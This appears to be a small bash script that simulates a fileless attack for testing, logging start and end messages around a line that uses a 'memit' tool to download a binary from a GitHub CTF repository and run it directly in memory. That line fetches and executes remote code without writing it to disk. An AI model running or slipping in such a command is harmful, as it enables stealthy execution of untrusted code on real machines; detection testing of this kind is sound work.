#!/bin/bash
LOG_NAME="malicious.log"

echo "Fileless attack started" >> $LOG_NAME
./memit-linux-amd64 https://raw.githubusercontent.com/MaherAzzouzi/LinuxExploitation/master/Fword2020/blacklist/blacklist &
echo "Fileless attack ended" >> $LOG_NAME
